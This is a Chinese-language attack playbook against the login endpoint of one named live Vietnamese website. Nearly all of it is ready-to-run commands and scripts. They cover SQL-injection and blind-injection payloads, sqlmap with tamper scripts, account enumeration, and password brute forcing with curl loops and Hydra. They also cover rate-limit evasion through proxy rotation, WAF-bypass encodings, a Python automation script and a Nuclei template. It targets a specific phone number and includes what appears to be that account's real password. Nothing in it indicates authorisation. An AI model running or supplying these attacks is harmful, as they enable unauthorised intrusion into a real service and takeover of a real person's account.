# emsone.com.vn 登录接口测试

## 目标信息
- URL: https://emsone.com.vn/Account/JLogin
- 方法: POST
- 协议: HTTP/2
- Content-Type: application/x-www-form-urlencoded

## 测试点

### 1. SQL注入测试

```bash
# MobileNumber参数SQL注入
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: ASP.NET_SessionId=test" \
  --http2 \
  -d "MobileNumber=0934257886' OR '1'='1&Password=test"

# 时间盲注
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --http2 \
  -d "MobileNumber=0934257886' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--&Password=test" \
  -w "\n时间: %{time_total}\n"

# SQLMap测试
sqlmap -u "https://emsone.com.vn/Account/JLogin" \
  --data "MobileNumber=0934257886&Password=test" \
  --method POST \
  --headers "Cookie: ASP.NET_SessionId=test" \
  -p MobileNumber,Password \
  --batch \
  --tamper=space2comment,charencode
```

### 2. 账户枚举测试

```bash
# 测试手机号是否存在（通过响应时间/错误消息）
for phone in 0934257886 0123456789 0987654321; do
    curl -X POST "https://emsone.com.vn/Account/JLogin" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      --http2 \
      -d "MobileNumber=$phone&Password=wrongpass" \
      -w "\n手机号: $phone - 状态码: %{http_code} - 响应长度: %{size_download}\n" \
      -s | grep -i "不存在\|错误\|invalid\|incorrect"
done
```

### 3. 暴力破解测试

```bash
# 弱密码字典攻击
while read pass; do
    curl -X POST "https://emsone.com.vn/Account/JLogin" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      --http2 \
      -d "MobileNumber=0934257886&Password=$pass" \
      -w "\n密码: $pass - 状态码: %{http_code}\n" \
      -s | grep -i "成功\|success\|登录\|login"
done < passwords.txt

# Hydra暴力破解
hydra -l 0934257886 -P passwords.txt \
  emsone.com.vn https-post-form \
  "/Account/JLogin:MobileNumber=^USER^&Password=^PASS^:错误"
```

### 4. 会话管理测试

```bash
# Session固定测试
# 1. 获取初始Session
SESSION1=$(curl -c cookies.txt -s "https://emsone.com.vn/dang-nhap" | grep -oP 'ASP.NET_SessionId=[^;]+')

# 2. 尝试登录后Session是否变化
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Cookie: $SESSION1" \
  --http2 \
  -d "MobileNumber=0934257886&Password=Thanhdat89%40" \
  -c cookies_after.txt

# 3. 检查Session是否被复用
```

### 5. 速率限制绕过

```bash
# 代理轮换绕过
for proxy in $(cat proxies.txt); do
    curl -X POST "https://emsone.com.vn/Account/JLogin" \
      --proxy $proxy \
      -H "Content-Type: application/x-www-form-urlencoded" \
      --http2 \
      -d "MobileNumber=0934257886&Password=test$RANDOM"
    sleep 1
done

# User-Agent轮换
UA_LIST=("Mozilla/5.0" "Chrome/142" "Firefox/120")
for ua in "${UA_LIST[@]}"; do
    curl -X POST "https://emsone.com.vn/Account/JLogin" \
      -H "User-Agent: $ua" \
      --http2 \
      -d "MobileNumber=0934257886&Password=test"
done
```

### 6. 信息泄露测试

```bash
# 错误消息分析
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --http2 \
  -d "MobileNumber=0934257886&Password=wrong" \
  -v 2>&1 | grep -i "error\|exception\|stack\|trace"

# 响应头信息泄露
curl -I "https://emsone.com.vn/Account/JLogin" \
  --http2 | grep -i "server\|x-powered\|x-aspnet"
```

### 7. 参数污染测试

```bash
# 重复参数
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --http2 \
  -d "MobileNumber=0934257886&MobileNumber=admin&Password=test"

# 数组参数
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --http2 \
  -d "MobileNumber[]=0934257886&Password=test"
```

### 8. WAF绕过测试

```bash
# Unicode编码绕过
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --http2 \
  -d "MobileNumber=0934257886\u0027\u0020\u004f\u0052\u0020\u0031\u003d\u0031\u002d\u002d&Password=test"

# 注释符绕过
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --http2 \
  -d "MobileNumber=0934257886'/**/OR/**/1=1--&Password=test"

# 大小写混合
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --http2 \
  -d "MobileNumber=0934257886' UnIoN SeLeCt 1,2,3--&Password=test"
```

### 9. 自动化测试脚本

```python
#!/usr/bin/env python3
# emsone_login_test.py

import requests
import time
import sys

TARGET = "https://emsone.com.vn/Account/JLogin"

# SQL注入payload
sql_payloads = [
    "0934257886' OR '1'='1",
    "0934257886' OR 1=1--",
    "0934257886' UNION SELECT NULL--",
    "0934257886' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
]

# 暴力破解
passwords = ["123456", "password", "admin", "12345678", "qwerty"]

def test_sql_injection():
    print("[+] 测试SQL注入...")
    for payload in sql_payloads:
        data = {
            "MobileNumber": payload,
            "Password": "test"
        }
        try:
            r = requests.post(TARGET, data=data, timeout=10, verify=False)
            if "成功" in r.text or "登录" in r.text.lower() or r.status_code == 302:
                print(f"[!] 可能SQL注入: {payload}")
        except:
            pass

def test_bruteforce():
    print("[+] 测试暴力破解...")
    for pwd in passwords:
        data = {
            "MobileNumber": "0934257886",
            "Password": pwd
        }
        try:
            r = requests.post(TARGET, data=data, timeout=10, verify=False)
            if "成功" in r.text or r.status_code == 302:
                print(f"[!] 可能弱密码: {pwd}")
        except:
            pass

if __name__ == "__main__":
    test_sql_injection()
    test_bruteforce()
```

### 10. Nuclei模板测试

```yaml
id: emsone-login-sqli

info:
  name: EMSOne Login SQL Injection
  author: redteam
  severity: high

http:
  - method: POST
    path:
      - "{{BaseURL}}/Account/JLogin"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "MobileNumber=0934257886' OR '1'='1&Password=test"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "成功"
          - "登录"
```

## 快速测试命令

```bash
# 一键测试（SQL注入）
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --http2 \
  -d "MobileNumber=0934257886' OR '1'='1&Password=test" \
  -v

# 测试账户枚举
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --http2 \
  -d "MobileNumber=0934257886&Password=wrong" \
  -s | jq .

# 测试速率限制
for i in {1..10}; do
    curl -X POST "https://emsone.com.vn/Account/JLogin" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      --http2 \
      -d "MobileNumber=0934257886&Password=test$i" \
      -w "\n请求$i: %{http_code}\n"
done
```
